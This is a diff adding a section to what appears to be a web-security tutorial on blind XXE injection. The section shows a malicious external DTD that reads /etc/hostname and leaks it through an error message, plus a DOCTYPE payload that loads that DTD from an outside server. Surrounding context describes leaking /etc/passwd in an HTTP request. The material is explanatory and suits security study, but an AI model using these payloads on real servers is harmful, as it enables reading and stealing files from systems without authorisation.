@@ -299,3 +299,39 @@ The XML external entity that will trigger all these DTD actions must be sent to 
 The above external entity will get our malicious DTD available at `https://target.site.com/malicious.dtd` and then, evaluate it because, `xxe` is used in the end.
 
 If all ran successfully we should see a HTTP GET request with the contents of `/etc/passwd` in the request parameter.
+
+>**Note:** The reason for using external DTD **stored in our server** is because, as per XML specification, defining an external parameter entity inside another parameter entity is not allowed in internal DTD but allowed in external DTD. Although some parsers might allow but, most of them don't.
+
+### Exfiltrate data using Blind XXE Injection through error messages
+
+In some cases, you might be able to exfiltrate data using error messages that gets returned from the server.
+
+For example, if you try to refer XML external entity to some non-existent file, you will receive an error message along with the file name. If the server sends the error message with the response then, we can try to exfiltrate data in it.
+
+To be able to use this technique we need two things,
+
+1. First, we host an external DTD that will *throw an XML error intentionally* and the error message **must include** the data that we want to exfiltrate.
+2. Second, an external entity must be sent to the vulnerable webserver which will load the external DTD file from our server and then, use it.
+
+The malicious XML DTD will look something like this,
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///bla/bla/%file;'>">
+%eval;
+%error;
+```
+
+The DTD will,
+
+1. Create an external XML entity `file`, that will contain the contents of file `/etc/hostname`.
+2. Create another external entity `eval`, that will declare a *dynamic external entity* `error`.
+3. Next, `file` is evaluated with contents from file `/etc/hostname`.
+4. When `eval` gets evaluated, a new *XML external entity* `error`, gets declared with reference to the file `/bla/bla/%file;`. Here, `%file;` get replaced with contents of `file` entity. If file `/etc/hostname` contains `WyvernDrexx` then, `file` entity will have `WyvernDrexx` so, the `error` entity will refer to file: `/bla/bla/WyvernDrexx`. 
+5. At last, since file `/bla/bla/WyvernDrexx` doesn't exist so the **XML parser** fails to evaluate `error` and throws an error similar to, `Error: File '/bla/bla/WyvernDrexx;' does not exist.`. Now, from the error message we can extract the hostname of the server.
+
+The DTD sent to the server that will trigger the malicious DTD will be,
+
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://target.site.com/malicious.dtd"> %xxe;]>
+```
